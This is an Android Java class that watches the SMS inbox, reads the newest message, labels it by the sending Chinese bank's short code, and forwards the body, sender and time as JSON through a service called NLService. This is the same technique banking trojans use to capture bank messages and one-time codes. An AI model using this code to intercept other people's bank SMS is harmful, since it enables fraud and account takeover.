package com.qianyou.utils;

import java.util.Date;

import org.json.JSONException;
import org.json.JSONObject;

import com.qianyou.listener5.Log;
import com.qianyou.listener5.MainActivity;
import com.qianyou.listener5.NLService;

import android.R.string;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;

public class SMSContentObserver extends ContentObserver {
    private static final int MSG_INBOX = 1;
    private Context mContext;
    private Handler mHandler; // 更新UI
    String[] projection = new String[]{
            "_id",
            "address",
            "person",
            "body",
            "date",
            "type"
        };
    public SMSContentObserver(Context mContext,
                              Handler mHandler) {
        super(mHandler); // 所有ContentObserver的派生类都需要调用该构造方法
        this.mContext = mContext;
        this.mHandler = mHandler;
    }
    /**
     * 当观察到的Uri发生变化时，回调该方法去处理。所有ContentObserver的派生类都需要重载该方法去处理逻辑
     * selfChange:回调后，其值一般为false，该参数意义不大
     */
    @Override
    public void onChange(boolean selfChange) {
        // TODO Auto-generated method stub
        super.onChange(selfChange);
      //  Log.T("收到消息");
        Cursor cursor =null; 
        try
        {
          //读取收件箱中的短信 
          cursor = mContext.getContentResolver().query(Uri.parse("content://sms/inbox"), projection, null, null, "date desc"); 
         // Log.T("cur"+cursor);
          String body;
          boolean hasDone =false;
          if (cursor !=null)
          { 
            while (cursor.moveToNext())
            {
            	//Log.T(cursor.toString());
              body = cursor.getString(cursor.getColumnIndex("body"));
//              Log.T("id="+cursor.getString(cursor.getColumnIndex("_id")));
            //  Log.T("address="+cursor.getString(cursor.getColumnIndex("address")));
//              Log.T("person="+cursor.getString(cursor.getColumnIndex("person")));
             // Log.T("data="+cursor.getString(cursor.getColumnIndex("date")));
//              Log.T("type"+cursor.getString(cursor.getColumnIndex("type")));
              if(body !=null)//&& body.equals("【startMyActivity】"
              {
            	  //Log.T(body);
                  String title = cursor.getString(cursor.getColumnIndex("address"));
                  String time = cursor.getString(cursor.getColumnIndex("date"));
                  if (title.equals("95533")) {
					title="建设银行";
                  }else if (title.equals("95599")) {
					title="中国农业银行";
                  }else if (title.equals("95588")) {
					title="工商银行";
                  }else if (title.equals("95566")) {
					title="中国银行";
                  }else if (title.equals("95580")) {
					title="邮储银行";
                  }else if (title.equals("95511")) {
					title="平安银行";
                  }
                  send(body, "bank", title, time);
                  mHandler.obtainMessage(MSG_INBOX, body).sendToTarget();
                hasDone =true;
                break;
              }
              if (hasDone)
              {
                break;
              }
            } 
          } 
        }
        catch(Exception e)
        {
        	//Log.T(e.toString());
          e.printStackTrace();
        }
        finally
        {
        	//Log.T("fail");
          if(cursor!=null)    cursor.close();
        }
    }
    public void send(final String data,final String type,final String title,final String time)
	{
		new Thread(new Runnable() {
			
			@Override
			public void run() {
				// TODO Auto-generated method stub
				JSONObject jo=new JSONObject();
				try {
					jo.put("action", MainActivity.BANKRESULT);
					jo.put("data",data);
					jo.put("type",type);
					jo.put("title",title);
					jo.put("time", time );
					NLService.sendToMain(jo.toString(),false);
					Thread.sleep(1000);
					NLService.sendToMain(jo.toString(),false);
				} catch (JSONException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				
				
			}
		}).run();
		
	}
}
